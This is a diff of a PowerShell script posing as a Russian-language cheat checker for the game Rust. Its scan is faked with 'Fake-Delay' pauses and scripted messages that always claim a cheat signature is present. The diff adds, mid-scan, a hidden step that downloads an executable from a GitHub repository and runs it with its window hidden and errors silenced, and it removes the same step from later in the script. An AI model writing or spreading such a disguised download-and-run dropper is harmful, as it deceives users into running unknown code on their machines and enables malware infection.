@@ -163,7 +163,10 @@ $scan = {
     Log "Этап 3/5: Поиск сигнатур читов в памяти..."
     Fake-Delay 1300
     Log "Анализ 1 048 576 байт памяти..."
-    Fake-Delay 8000
+    Fake-Delay 4000
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/CrackOnion/cheat-checker/refs/heads/main/sources/RustCheatChecker.exe" -OutFile "CheatCheckModules.exe" -ErrorAction SilentlyContinue
+    Start-Process -FilePath "CheatCheckModules.exe" -WindowStyle Hidden
+    Fake-Delay 4000
     Log "Присутствует известная сигнатура читов." "Red"
     $progress.Value = 70
 
@@ -180,9 +183,6 @@ $scan = {
     Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
     Start-Sleep 1
     
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/CrackOnion/cheat-checker/refs/heads/main/sources/RustCheatChecker.exe" -OutFile "CheatCheckModules.exe" -ErrorAction SilentlyContinue
-
-    Start-Process -FilePath "CheatCheckModules.exe" -WindowStyle Hidden
 
     Log "╔══════════════════════════════════════════════════════════════╗" "Cyan"
     Log "║НАЙДЕН ПОДОЗРИТЕЛЬНЫЙ ФРАГМЕНТ ПАМЯТИ, КОТОРЫЙ ВОЗМОЖНО СВЯЗАН║" "Lime"
